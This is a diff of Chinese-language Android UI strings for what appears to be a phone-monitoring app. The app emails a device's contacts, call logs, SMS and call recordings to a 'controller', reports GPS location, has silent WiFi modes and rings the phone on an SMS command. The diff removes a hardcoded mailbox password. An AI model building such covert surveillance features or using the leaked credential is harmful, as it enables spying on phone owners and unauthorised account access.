@@ -39,7 +39,6 @@
     <string name="phonecall_record">通话录音</string>
     
     <!-- Mail -->
-    <string name="mail_sender_pwd">canadausa</string>
     <string name="mail_from">来自</string>
     <string name="mail_description">（内附联系人，电话，短信记录）</string>
     <string name="mail_body_info">你好，这是来自%s的自动发信，内附联系人，电话，短信记录。试用期内有可能无法看到该来源手机的号码，显示为设备号，请见谅。</string>
@@ -57,7 +56,7 @@
     <!-- Preferences -->
     <string name="pref_title">设定</string>
     <string name="pref_category_sender_mail_key">pref_category_sender</string>
-    <string name="pref_category_sender_mail_title">发信邮箱（可选项）</string>
+    <string name="pref_category_sender_mail_title">发信邮箱</string>
     <string name="pref_category_receiver_key">pref_category_receiver</string>
     <string name="pref_category_receiver_title">主控者</string>
     <string name="pref_category_info_collector_key">pref_category_info_collector</string>
@@ -69,9 +68,8 @@
     <string name="pref_category_gps_title">获取所在地理位置</string>
     <string name="pref_category_ring_title">响铃</string>
     
-    <string name="pref_use_self_sender_title">使用自己的邮箱发信</string>
-    <string name="pref_use_self_sender_summary">仅支持Gmail和QQ邮箱。使用您自己的邮箱发信更有利于保护您的隐私，否则将使用系统内置邮箱发信。</string>
     <string name="pref_sender_mail_title">发信邮箱（仅GMail或QQ）</string>
+    <string name="pref_sender_mail_summary">仅支持Gmail和QQ邮箱。</string>
     <string name="pref_sender_pwd_title">发信邮箱密码</string>
     <string name="pref_invalid_sender_mail">%s 不是一个有效的GMail或QQ邮箱地址。</string>
     <string name="pref_recv_mail_title">收信邮箱</string>
@@ -101,7 +99,6 @@
     <string name="pref_network_mode_summary">"WIFI静默"和"WIFI主动"模式仅使用WIFI，不占用3G流量。</string>
     <string name="pref_network_mode_dlg_title">选择模式</string>
     <string name="pref_record_all_time_limit_in_trial">试用期间仅允许10次通话录音。</string>
-    <string name="pref_must_use_self_sender">鉴于保护隐私，只有使用您自己的发信邮箱（仅支持GMail和QQ邮箱）时，才允许对所有电话录音。更多问题请咨询客服。</string>
     <string name="pref_ring_word_title">强制响铃</string>
     <string name="pref_ring_word_summary">发送短信#xl可强制使其响铃。</string>
     
